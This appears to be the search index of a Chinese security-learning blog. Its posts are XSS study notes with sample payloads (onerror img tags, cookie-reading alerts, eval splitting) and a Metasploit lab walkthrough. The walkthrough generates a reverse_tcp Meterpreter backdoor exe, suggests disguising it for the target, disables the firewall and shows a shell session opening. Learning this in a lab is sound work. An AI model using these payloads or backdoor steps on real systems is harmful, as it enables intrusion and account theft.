<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SRC]]></title>
    <url>%2F2019%2F08%2F09%2FSRC%2F</url>
    <content type="text"><![CDATA[记录第一个中危漏洞]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS]]></title>
    <url>%2F2019%2F08%2F09%2FXSS%2F</url>
    <content type="text"><![CDATA[一、XSS简介二、XSS漏洞的危害三、XSS漏洞的类型四、XSS的构造五、XSS的变形六、Shellcode的调用 一、XSS owasp top 10 之一XSS 跨站脚本攻击 Cross Site Script(ing) css (层叠样式表) XSS 所用的攻击代码主要是Javascript 将恶意代码注入到网页中 JS能够做到的事情，就是可能受到攻击 XSS 攻击的是用户、浏览器、客户端、微博留言板的位置，有收集用户输入的地方，都有可 能遭受XSS的攻击 二、盗取各种用户账号窃取用户cookie资料，冒充用户身份进入网站 劫持用户会话，执行任意操作 刷流量，执行弹窗广告 传播蠕虫病毒 漏洞验证alert(/xss/) alert(%0ddocument%0a.%09cookie); &lt;script>alert(/xss/) %09alert%09(1); %0dalert%0d(1); %0aalert%0a(1); alert(document%0a.%09cookie); alert(%0ddocument%0a.%09cookie); a=123 只要浏览器弹框，就意味着JS代码可以被执行，就可以执行其他语句。 要想弹框，最好能让浏览器识别标签 三、XSS漏洞的类型反射型XSS非持久性、参数型跨站脚本 搜索框、用户登录的地方 窃取用户cookie或进行钓鱼欺骗 存储型XSS持久性跨站脚本，更具有威胁性、恶意代码存储在数据库、其他文件等地方 留言板、评论、博客日志 渗透网站、挂马、蠕虫病毒、钓鱼 DOM型XSS# var pos=document.URL.indexOF("context=")+8 document.write(decodeURL(document.URL.substring(pos,document.URL.length))) 更改原来文档的DOM树 四、XSS的构造不同的浏览器效果不一样，同一款浏览器，不同版本之间效果不一样 利用&lt;&gt;构造HTML/JavaScript 如果用户可以随心所欲的引入&lt;&gt;等标记，那么他就能操作一个HTML标签，然后通过标签就能输入任意由JavaScript或VBscript编写的恶意脚本代码 利用HTML标签的属性值进行XSS HTML中有标签，标签中有属性，属性有属性值。有的HTML标签属性值，支持Javascript:[code] ##touch me 产生自己的事件 事件就是用户何时做了什么事情 处理相关事件的语句，事件响应函数 我们把事件分为3个不同类型 用户接口（鼠标键盘） 逻辑（处理的结果） 变化（对文档的修改） # #alert(/xss/) # # 利用CSS跨站（不太常见）使用范围比较窄 # # #&lt;?php if(isset($_post[‘submit’])){ echo $_post[‘text’]; }else echo”sorry”; } ?&gt; 五、XSS的变形大小写转换# 引号的使用无引号 # 单引号 # 双引号 # 利用/代替空格#&lt;Img/sRc=“#” Onerror=alert(/xss/)/&gt; CSS中的变形使用全角字符 #body{background-image:expre/***/ssion(alert(1);} 注释会被浏览器忽略#body{background-image:expression(alert(1);} 样式表中的\和\0同样会被浏览器忽略 #@import’javasc\ri\0pt:alert(“xss”)’; Tab与Enter#&lt;ImgsRc=’#’ Onerror =alert(/xss/)/&gt; 对标签属性值进行转码拆分跨站#z='alert' z=z+'(/xss/)' eval(z) 六、Shellcode的调用ShellCode最初是指溢出程序和蠕虫病毒的核心，实际上是指利用一个漏洞所执行的代码 Exploit的英文意思是利用，通常表示完整的编写好的漏洞利用工具（或程序）Exploit往往包含来了ShellCode Poc proof of concept 的缩写，是一段证明漏洞存在的程序代码片段 动态远程调用JS # windows.location.hash XSS DOWNLODER 将ShellCODE存储到网站的数据库中，包括网页信息、文章内容、个人资料存储的地方，然后再把它下载下来执行 简单来说就是构造一个XSS下载器事先把Shellcode写在网站的某一个页面 再利用XMLHTTP控件向网站发送HTTP请求然后执行返回数据 备选存储技术 另外一种方法是把XSS SHELLCODE 存储在客户端本地域中，如HTTPCOOKIE FISH共享对象 USEDATE]]></content>
  </entry>
  <entry>
    <title><![CDATA[metasploit之后门的生成]]></title>
    <url>%2F2019%2F08%2F09%2Fmetasploit%2F</url>
    <content type="text"><![CDATA[后门简介后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。 实验环境Kali linux ip 192.168.10.128 WIN7 ip 10.0.2.2 选择以下攻击载荷并生成一个exe的木马程序 命令msfconsole 开启Metasploit 查看payload，使用命令show payloads，msf提供了多种攻击载荷 选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe 其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下 使用命令 cd /，可以看到我们生成的exe文件 接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。 为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。 在kali linux上打开ssh服务的方法： apt-get install openssh-server#安装 一、配置SSH参数 修改sshd_config文件，命令为： vi /etc/ssh/sshd_config 将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes 右击桌面，单击打开终端，输入命令 将PermitRootLogin without-password修改为 PermitRootLogin yes 二、启动SSH服务 命令为： /etc/init.d/ssh start 或者 service ssh start 查看SSH服务状态是否正常运行，命令为 /etc/init.d/ssh status 或者service ssh status 那么需要生成两个密钥： ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key 执行命令后都会让输入密码，直接敲回车设置为空即可 Win7关闭防火墙的方法 接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128 ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。 在msf中设置监听 use exploit/multi/handler show options 设置我们后门生成时的攻击载荷 set payload windows/meterpreter/reverse_tcp show options set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp 设置参数（与后门的参数相对应） msf exploit(multi/handler) &gt; set LHOST 192.168.10.128 LHOST =&gt; 192.168.10.128 msf exploit(multi/handler) &gt; set LPORT 4444 LPORT =&gt; 4444 msf exploit(multi/handler) &gt; run 在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程 序时，会弹回一个shell [*] Started reverse TCP handler on 192.168.10.128:4444 [*] Sending stage (179779 bytes) to 192.168.10.1 [*] Sleeping before handling stage… [*] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800 实验结束]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F08%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
